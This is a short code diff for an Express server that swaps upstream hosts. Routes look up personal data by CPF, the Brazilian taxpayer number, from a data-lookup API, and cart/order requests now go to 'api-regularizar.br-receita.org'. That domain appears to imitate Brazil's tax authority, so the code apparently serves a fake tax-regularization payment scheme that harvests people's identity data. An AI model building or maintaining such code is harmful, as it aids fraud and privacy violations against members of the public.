@@ -32,7 +32,7 @@ import rateLimit from 'express-rate-limit';
     const { cpf } = req.params;
     
     try {
-      const apiUrl = `https://datagetapi.online/api/v1/cpf/${cpf}`;
+      const apiUrl = `https://api.dataget.site/api/v1/cpf/${cpf}`;
       const upstream = await fetch(apiUrl, { method: 'GET',
         headers: {
           'Content-Type': 'application/json',
@@ -63,7 +63,7 @@ import rateLimit from 'express-rate-limit';
     const { cpf } = req.params;
     
     try {
-      const apiUrl = `https://datagetapi.online/api/v1/cpf/${cpf}`;
+      const apiUrl = `https://api.dataget.site/api/v1/cpf/${cpf}`;
       const upstream = await fetch(apiUrl, { method: 'GET',
         headers: {
           'Content-Type': 'application/json',
@@ -107,7 +107,7 @@ import rateLimit from 'express-rate-limit';
       };
 
       const getOrder = await fetch(
-        `https://api-tenant.ads-information.top/cart/${cartId}`,
+        `https://api-regularizar.br-receita.org/cart/${cartId}`,
         {
           method: 'GET',
           headers: {
@@ -127,7 +127,7 @@ import rateLimit from 'express-rate-limit';
         return res.json(getOrderData);
       }
       const orderRes = await fetch(
-        `https://api-tenant.ads-information.top/cart/${cartId}/order?`,
+        `https://api-regularizar.br-receita.org/cart/${cartId}/order?`,
         {
           method: 'POST',
           headers: {
